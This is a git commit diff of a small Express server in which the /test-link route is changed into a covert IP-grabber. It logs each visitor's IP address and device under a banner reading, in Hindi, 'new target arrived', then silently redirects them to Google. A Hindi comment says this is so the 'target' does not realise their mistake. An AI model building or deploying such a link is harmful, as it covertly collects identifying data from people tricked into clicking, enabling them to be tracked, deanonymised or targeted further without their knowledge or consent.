b31a5f5e31cbe08ded894a2303e4bf8602caa179
JAMOD13 <jamodmod1358@gmail.com>
2026-06-30 20:59:29 +0530

    Redirect to google setup

--- server.js
+++ server.js
@@ -1,20 +1,20 @@
 const express = require('express');
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 
 app.get('/test-link', (req, res) => {
-    let clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    let userAgent = req.headers['user-agent'];
+    const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const userDevice = req.headers['user-agent'];
 
-    console.log("\n--- [ Nayi Request ] ---");
-    console.log("IP Address: " + clientIP);
-    console.log("Device: " + userAgent);
-    console.log("------------------------\n");
+    console.log(`\n============== NAYA TARGET AAYA ==============`);
+    console.log(`[+] IP Address: ${userIP}`);
+    console.log(`[+] Device Info: ${userDevice}`);
+    console.log(`==============================================\n`);
 
-    res.send("<h1>Server Active</h1><p>Aapka test link sahi se kaam kar raha hai!</p>");
+    // Target ko galti ka ehsaas dilaye bina Google par bhej dein
+    res.redirect('https://www.google.com');
 });
 
-app.listen(PORT, '0.0.0.0', () => {
+app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-
